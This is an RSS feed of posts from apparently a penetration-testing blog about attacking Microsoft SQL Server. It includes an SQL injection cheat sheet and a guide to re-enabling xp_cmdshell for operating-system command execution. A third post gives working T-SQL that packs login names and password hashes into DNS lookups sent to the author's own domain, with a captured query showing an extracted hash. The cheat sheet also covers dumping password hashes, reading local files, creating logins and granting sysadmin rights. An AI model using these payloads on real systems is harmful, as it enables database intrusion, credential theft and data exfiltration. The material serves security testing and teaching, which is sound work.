<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>mssql &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/mssql/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 10 Mar 2012 19:00:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Update: MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/mssqlics-update</link>
					<comments>https://pentestmonkey.net/blog/mssqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 06 Apr 2008 16:32:12 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=46</guid>

					<description><![CDATA[I just made some minor additions to the MSSQL Injection Cheat Sheet : Creating Users Deleting Users Assigning Users the DBA privilege]]></description>
										<content:encoded><![CDATA[<p>I just made some minor additions to the <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL Injection Cheat Sheet</a> :</p>
<ul>
<li>Creating Users</li>
<li>Deleting Users</li>
<li>Assigning Users the DBA privilege</li>
</ul>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mssqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:23:00 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=88</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into MSSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<br />
<span id="more-88"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 &#8212; comment<br />
SELECT /*comment*/1</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();<br />
SELECT system_user;<br />
SELECT user;<br />
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins &#8212; priv, mssql 2000;<br />
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins &#8212; priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br />
SELECT name, password_hash FROM master.sys.sql_logins &#8212; priv, mssql 2005;<br />
SELECT name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins &#8212; priv, mssql 2005</td>
</tr>
<tr>
<td> Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.  <a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>&#8212; current privs on a particular object in 2005, 2008<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;DATABASE&#8217;); &#8212; current database<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;SERVER&#8217;); &#8212; current server<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;master..syslogins&#8217;, &#8216;OBJECT&#8217;); &#8211;permissions on a table<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;sa&#8217;, &#8216;USER&#8217;);</p>
<p>&#8211;permissions on a user&#8211; current privs in 2005, 2008<br />
SELECT is_srvrolemember(&#8216;sysadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;dbcreator&#8217;);<br />
SELECT is_srvrolemember(&#8216;bulkadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;diskadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;processadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;serveradmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;setupadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;securityadmin&#8217;);</p>
<p>&#8212; who has a particular priv? 2005, 2008<br />
SELECT name FROM master..syslogins WHERE denylogin = 0;<br />
SELECT name FROM master..syslogins WHERE hasaccess = 1;<br />
SELECT name FROM master..syslogins WHERE isntname = 0;<br />
SELECT name FROM master..syslogins WHERE isntgroup = 0;<br />
SELECT name FROM master..syslogins WHERE sysadmin = 1;<br />
SELECT name FROM master..syslogins WHERE securityadmin = 1;<br />
SELECT name FROM master..syslogins WHERE serveradmin = 1;<br />
SELECT name FROM master..syslogins WHERE setupadmin = 1;<br />
SELECT name FROM master..syslogins WHERE processadmin = 1;<br />
SELECT name FROM master..syslogins WHERE diskadmin = 1;<br />
SELECT name FROM master..syslogins WHERE dbcreator = 1;<br />
SELECT name FROM master..syslogins WHERE bulkadmin = 1;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(&#8216;sysadmin&#8217;); &#8212; is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try &#8216;bulkadmin&#8217;, &#8216;systemadmin&#8217; and other values from the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br />
</a> SELECT is_srvrolemember(&#8216;sysadmin&#8217;, &#8216;sa&#8217;); &#8212; is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br />
SELECT name FROM master..syslogins WHERE sysadmin = &#8216;1&#8217; &#8212; tested on 2005</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;<br />
SELECT DB_NAME(N); &#8212; for N = 0, 1, 2, &#8230;</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#8216;mytable&#8217;); &#8212; for the current DB only<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = &#8216;U&#8217;; &#8212; use xtype = &#8216;V&#8217; for views<br />
SELECT name FROM someotherdb..sysobjects WHERE xtype = &#8216;U&#8217;;<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>&#8212; NB: This example works only for the current database.  If you wan&#8217;t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br />
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#8216;U&#8217; AND syscolumns.name LIKE &#8216;%PASSWORD%&#8217; &#8212; this lists table, column for each column containing the word &#8216;password&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC &#8212; gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(&#8216;abcd&#8217;, 3, 1) &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 &#8212; returns 2<br />
SELECT 6 &amp; 1 &#8212; returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0x41) &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) &#8211; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(&#8216;1&#8217; as int);<br />
SELECT CAST(1 as char)</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; + &#8216;B&#8217; &#8211; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 &#8212; returns 1</span></td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END &#8212; returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td> WAITFOR DELAY &#8216;0:0:5&#8217; &#8212; pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(&#8216;master..xp_getfiledetails &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; nonpriv, works on 2000declare @host varchar(800); select @host = name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) + &#8216;.2.pentestmonkey.net&#8217; from sys.sql_logins; exec(&#8216;xp_fileexist &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; priv, works on 2005&#8211; NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.<br />
&#8212; Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell &#8216;net user&#8217;; &#8212; privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#8217;s disabled by default:<br />
EXEC sp_configure &#8216;show advanced options&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv<br />
EXEC sp_configure &#8216;xp_cmdshell&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));<br />
BULK INSERT mydata FROM &#8216;c:boot.ini&#8217;;<br />
DROP TABLE mydata;</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> &#8216;user&#8217;, &#8216;pass&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> &#8216;user&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> &#8216;user&#8217;, &#8216;sysadmin; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; &#8211;location of master.mdf<br />
EXEC sp_helpdb pubs; &#8211;location of pubs.mdf</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind<br />
model<br />
msdb<br />
pubs &#8212; not on sql server 2005<br />
tempdb</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p><strong>From Dan Crowley:</strong><br />
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a></p>
<p><strong>From Jeremy Bae:</strong><br />
Tip about sp_helpdb &#8211; included in table above.</p>
<p><strong>From Trip:</strong><br />
List DBAs (included in table above now):</p>
<blockquote><p>select name from master..syslogins where sysadmin = &#8216;1&#8217;</p></blockquote>
<p><strong>From Daniele Costa:</strong><br />
Tips on using fn_my_permissions in 2005, 2008 &#8211; included in table above.<br />
Also:<br />
To check permissions on multiple database you will have to use the following pattern.</p>
<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)</p></blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.<br />
In this case a simple trick is to use the following syntax:</p>
<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)
</p></blockquote>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Enabling xp_cmdshell for SQL Server 2005</title>
		<link>https://pentestmonkey.net/blog/resurecting-xp_cmdshell</link>
					<comments>https://pentestmonkey.net/blog/resurecting-xp_cmdshell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Thu, 12 Apr 2007 19:53:05 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=9</guid>

					<description><![CDATA[It&#8217;s disappointing to exploit a SQL injection, find you&#8217;re &#8220;sa&#8221;, then realise they&#8217;ve disabled xp_cmdshell (the default for MSSQL 2005). Fortunately, it&#8217;s possible to re-enable it quite easily&#8230; Under SQL Server 2000 the database administrator can do lots of cool things like &#8220;bulk insert&#8221;, reading the registry and connecting to other SQL Servers. By far [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>It&#8217;s disappointing to exploit a SQL injection, find you&#8217;re &#8220;sa&#8221;, then realise they&#8217;ve disabled xp_cmdshell (the default for MSSQL 2005). Fortunately, it&#8217;s possible to re-enable it quite easily&#8230;</p>
<p><span id="more-9"></span><br />
Under SQL Server 2000 the database administrator can do lots of cool things like &#8220;bulk insert&#8221;, reading the registry and connecting to other SQL Servers. By far the most fun, though was xp_cmdshell to run arbitrary OS commands as SYSTEM.</p>
<p>Some of this fun is still possible on SQL Server 2005, but some of the pentester-friendly extended stored procedures are disabled by default. I recently realised that if they haven&#8217;t been removed completely from the server, it&#8217;s trivial to re-enabled them. To enable xp_cmdshell, for example:</p>
<pre>EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;</pre>
<p>The above even seems to work through SQL injection. Handy eh? Unfortunately, xp_cmdshell no longer runs as SYSTEM.</p>
<p>Once you&#8217;ve had your fun, you can disable xp_cmdshell again like so:</p>
<pre>EXEC sp_configure 'xp_cmdshell', 0;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;</pre>
<p>I don&#8217;t claim to be the first to notice that xp_cmdshell could be re-enabled so easily, I just thought it was interesting enough to duplicate this information one more time.</p>
<p>Check out these links for more information about <a href="http://doc.ddart.net/mssql/sql70/ra-rz_5.htm">RECONFIGURE</a> and <a href="http://msdn2.microsoft.com/en-us/library/ms190693.aspx">enabling xp_cmdshell</a>.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/resurecting-xp_cmdshell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Exfiltrating Data From MS SQL Server Via DNS</title>
		<link>https://pentestmonkey.net/blog/mssql-dns</link>
					<comments>https://pentestmonkey.net/blog/mssql-dns#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 08 Apr 2007 18:59:47 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[dns]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=8</guid>

					<description><![CDATA[Exfiltrating data via Blind SQL Injection vulnerabilities can be slow, or the very least undesirably noisy. DNS may provide a faster alternative if the target system is connected to the Internet. Below are some notes I made on exfiltrating data from MS SQL Server 2005. Preamble Why Blind SQL Injection can be a Pain Since [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Exfiltrating data via <a href="http://www.spidynamics.com/whitepapers/Blind_SQLInjection.pdf">Blind SQL Injection</a> vulnerabilities can be slow, or the very least undesirably noisy. DNS may provide a faster alternative if the target system is connected to the Internet.<br />
<span id="more-8"></span></p>
<p>Below are some notes I made on exfiltrating data from MS SQL Server 2005.</p>
<h2>Preamble</h2>
<h3>Why Blind SQL Injection can be a Pain</h3>
<p>Since the injection is blind, you don&#8217;t have the luxury of getting data out fast with a UNION SELECT, or using MS SQL server error messages.</p>
<p>Depending on your definition of &#8220;Blind SQL Injection&#8221; you might be able to use differing responses from the app to extract data 1 bit at time by asking &#8220;yes or no&#8221; questions. In the worst case, you&#8217;ll have to use something like <a href="http://msdn2.microsoft.com/en-us/library/ms187331.aspx">WAITFOR DELAY</a> or <a href="http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark">BENCHMARK</a> to painstakingly extract data in a bitwise fashion.</p>
<p>Even with the help of automated tools, this process can be slow. Owing to the fact you normally need 1 request for each bit of data you extract, you&#8217;ll typically need hundreds or even thousands of queries. Traditional exploitation of blind SQL injection is therefore a very noisy attack.</p>
<h3>Some Potential Alternatives</h3>
<p>There may not be any other options open to you, but if you&#8217;re lucky there&#8217;ll be a shortcut. For example you might be able to:</p>
<ul>
<li>open a database connection from the backend database to a database you control.</li>
<li>export data to a file and read the file back by some other means.</li>
<li>write data of interest to another part of the database you can read (e.g. change the first line of your address to be the admin&#8217;s password hash).</li>
<li>to embed the answer to your SQL queries in a DNS request.</li>
</ul>
<h2>Using DNS to Exfiltrate Data</h2>
<p>DNS requests are arguably more likely to be allowed out from the database server to arbitrary hosts on the Internet than any other query. Even if the Firewall is doing its job properly and preventing the database server from sending data <em>directly</em>to the internet, a DNS request originating from the server may still be allowed out via an internal DNS server.</p>
<p>Our challenge is simply to embed the result of our SQL query in the DNS request and to capture it when it makes its way onto the Internet.</p>
<p>Conceptually what we&#8217;re trying to achieve with our SQL injection is something like the following:</p>
<pre>   do_dns_lookup( (select top 1 password from users) + '.pentestmonkey.net' );</pre>
<p>We want to use a SELECT statement to obtain the password hash we&#8217;re interested in, append a domain name which we control to the end of it (e.g. pentestmonkey.net). Finally we perform a DNS lookup (address-record lookup for a fictitious hostname). We then run a packet sniffer on the name server for our domain and wait for the DNS record containing our hash.</p>
<pre>   someserver.example.com.1234 &gt; ns.pentestmonkey.net.53 A? 0x1234ABCD.pentestmonkey.net</pre>
<p>The string &#8220;0x1234ABCD&#8221; here represents the password hash we hope to extract using our SELECT statement. In his recent <a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0470080221.html">book</a>, David Litchfield talks about how to use UTL_INADDR on Oracle to exfiltrate password hashes via DNS. The rest of this blog entry contains the notes I made while trying to apply the same technique to SQL Server 2005</p>
<h2>Using DNS to Exfiltrate Data from SQL Server 2005</h2>
<p>So far I&#8217;ve only figured out how to do this given database administrator level credentials. The following examples assumes you&#8217;ve already have this level of privilege (e.g. from your sql injection).</p>
<p>Several stored procedures can take hostnames as arguments (usually as UNC paths). The ones I&#8217;ve looked at so far are:</p>
<ul>
<li>bulk insert mytable from &#8216;\somehostshare$file&#8217;;</li>
<li>xp_fileexist &#8216;\somehostshare$file&#8217;;</li>
</ul>
<p>Both are available to database admins by default on SQL Server 2005. Note that xp_fileexist doesn&#8217;t throw an error if your privileges are too low. If you don&#8217;t have sufficient privileges, xp_fileexist always returns a &#8220;file doesn&#8217;t exist&#8221; type response without actually processing the filename.  If you&#8217;re using SQL Server 2000 try xp_getfiledetails as this can be run by non-priv users.</p>
<p>I had some problems when I tried to include variable data as part of the hostname. Concatenation and subselects seem to be disallowed in most places where you&#8217;d want it:</p>
<ul>
<li>bulk insert mytable from &#8216;\&#8217; + &#8216;yourdatahere&#8217; + &#8216;share$file; &#8212; doesn&#8217;t work</li>
<li>exec(&#8216;xp_fileexist &#8221;\&#8217; + (select top 1 password from users) + &#8221;&#8217;share$file&#8221;&#8217;; &#8212; doesn&#8217;t work</li>
</ul>
<p>I was left with the following rather cumbersome example.</p>
<pre>   declare @host varchar(800);</pre>
<pre>  select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net' from sys.sql_logins;</pre>
<pre>  exec('xp_fileexist ''\' + @host + 'c$boot.ini''');</pre>
<p>It works, though. Here&#8217;s the DNS query observed from the pentestmonkey.net name server:</p>
<pre>   11:30:07.276608 IP 10.0.0.1.1605 &gt; 10.0.0.2.53:  3662+ A? sa-0x01004086ceb6370f972f9c9125fb8919e8078b3f3c3df37efdf0.2.pentestmonkey.net. (95)</pre>
<p>Note: Failed lookups seem to get cached, so the same SQL query won&#8217;t produce the same DNS query twice. To make sure that each query is different you can use a unique ID in the hostname (e.g. the &#8220;.2.&#8221; in the example above).</p>
<p>Since the hash is 52 bytes long (416-bits), this simple DNS trick just saved us 416 queries traditionally required to exfiltrate the hash using &#8220;yes or no&#8221; queries.</p>
<h2>How much data can go in a DNS request?</h2>
<p>This will probably depend on multiple factors such as the function to which the hostname is passed, and any length limitations imposed by nameservers which process the query before we see it.</p>
<p>In the case of MS SQL Server 2005 running on Windows 2003 I noticed two limitations:</p>
<p>1: No more that 63 characters are allowed for any subdomain / hostname section. The following is therefore the longest hostname I could form using only 2 dots:</p>
<pre>   123456789012345678901234567890123456789012345678901234567890123.pentestmonkey.net</pre>
<p>I was not able to add more data by using a domain name shorter than &#8220;pentestmonkey.net&#8221;.</p>
<p>2: The total length of the hostname seems to be capped at 248 characters</p>
<p>Some of this cannot contain useful data (i.e. a certain number of dots are required, and the domain name itself &#8220;pentestmonkey.net&#8221; does not contain any useful data). In the case of my domain, it was possible to store a maximum of 227 bytes of data in a DNS request.</p>
<pre>   012345678911234567892123456789312345678941234567895123456789612. 01234567891123456789212345678931234567894123456789512345678961b. 01234567891123456789212345678931234567894123456789512345678961c. 12345678901234567890123456789012345678.pentestmonkey.com.</pre>
<p>In this case, a shorter domain name DOES allow you to send more data.</p>
<p>The difficulty is that very long hostnames like this one seem to need a dot every 64 characters. This is something you&#8217;d need to concern yourself with while creating the hostname string within the SQL injection.</p>
<p>&nbsp;</p>
<h2>Feedback</h2>
<p>Please feel free to <a href="mailto:pentestmonkeyAATTpentestmonkey.net">mail</a> me if you think any of this is in error, or if you can offer any refinements.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mssql-dns/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
